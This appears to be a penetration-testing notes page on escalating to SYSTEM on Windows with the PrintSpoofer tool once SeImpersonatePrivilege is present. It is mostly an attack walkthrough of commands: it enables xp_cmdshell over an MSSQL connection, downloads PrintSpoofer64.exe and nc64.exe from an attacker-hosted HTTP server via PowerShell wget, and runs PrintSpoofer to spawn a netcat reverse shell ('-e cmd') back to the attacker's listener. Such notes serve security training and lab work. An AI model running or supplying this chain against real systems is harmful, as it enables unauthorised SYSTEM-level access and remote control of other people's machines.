---
title: PrintSpoofer
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
  - SeImpersonatePrivilege
---
# 🖨️ PrintSpoofer

!!! tip "Kernel exploits"
	- [Windows kernel exploits](windows-kernel-exploits.md)
	- [Linux kernel exploits](linux-kernel-exploits.md)


 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage `NT AUTHORITY\SYSTEM` level access on Windows Server 2019 and Windows 10 build 1809 onwards when the  command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) is listed. 

Download from: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

**1.** Spawn a SYSTEM process on a desktop or catch a reverse shell. For instance, let's imagine that we have access with

```
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
```

And that our user has the SeImpersonatePrivilege  listed when running:

```
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

**2.** Download the PrintSpoofer64.exe file from kali to the host

```
# from a different kali terminal locate the file and then
python3 -m http.server 80

# From the terminal with the mssql connection, upload PrintSpoofer64.exe and nc.exe
xp_cmdshell "powershell -c cd C:\Tools; wget http://IPfromOurKali/PrintSpoofer64.exe -outfile PrintSpoofer64.exe"
xp_cmdshell "powershell -c cd C:\Tools; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe"
```

**3.** Set a listener in the kali and execute it from the host:

```
# Set a listener from the kali machine
nc -lnvp 1234

# Execute the PrintSpoofer
xp_cmdshell "powershell -c cd C:\Tools; .\PrintSpoofer64.exe
 -c "C:\Tools\nc64.exe  $IPfromOurKali 1234 -e cmd"
```